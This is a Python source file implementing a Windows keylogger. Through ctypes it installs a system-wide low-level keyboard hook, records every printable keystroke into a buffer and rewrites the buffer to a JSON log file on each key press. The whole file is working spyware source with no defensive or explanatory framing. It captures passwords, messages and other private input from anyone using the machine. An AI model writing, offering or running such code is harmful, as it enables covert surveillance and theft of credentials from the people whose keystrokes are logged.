import ctypes
import json
import os
from ctypes import wintypes

user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

if ctypes.sizeof(ctypes.c_void_p) == 8:
    LRESULT = ctypes.c_int64
else:
    LRESULT = ctypes.c_int32

user32.CallNextHookEx.argtypes = (
    wintypes.HHOOK,
    ctypes.c_int,
    wintypes.WPARAM,
    wintypes.LPARAM,
)
user32.CallNextHookEx.restype = LRESULT

# ---------------- PATH FIX ----------------
BASE_DIR = os.path.abspath(
    os.path.join(os.path.dirname(__file__), "../../../")
)
LOG_DIR = os.path.join(BASE_DIR, "assets", "logs")
os.makedirs(LOG_DIR, exist_ok=True)

log_file = os.path.join(LOG_DIR, "keylog.json")
# ------------------------------------------

buffer = ""
keyboard_callback = None
hook = None


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]


LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
    LRESULT,
    ctypes.c_int,
    wintypes.WPARAM,
    wintypes.LPARAM,
)


def write_buffer():
    with open(log_file, "w", encoding="utf-8") as f:
        json.dump({"txt": buffer}, f, ensure_ascii=False)


@LowLevelKeyboardProc
def keyboard_proc(nCode, wParam, lParam):
    global buffer

    if nCode == 0 and wParam == WM_KEYDOWN:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode

        if 32 <= vk <= 126:
            buffer += chr(vk)
            write_buffer()

    return user32.CallNextHookEx(None, nCode, wParam, lParam)


def start_keyboard_logger():
    global keyboard_callback, hook

    keyboard_callback = keyboard_proc

    hook = user32.SetWindowsHookExW(
        WH_KEYBOARD_LL,
        keyboard_callback,
        None,
        0
    )
    if not hook:
        raise RuntimeError("Hook installation failed")

    print(f"[+] Keyboard hook installed | Logging to: {log_file}")

    try:
        msg = wintypes.MSG()
        while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) != 0:
            user32.TranslateMessageW(ctypes.byref(msg))
            user32.DispatchMessageW(ctypes.byref(msg))
    finally:
        if hook:
            user32.UnhookWindowsHookEx(hook)
        print("[+] Keyboard hook removed")


if __name__ == "__main__":
    start_keyboard_logger()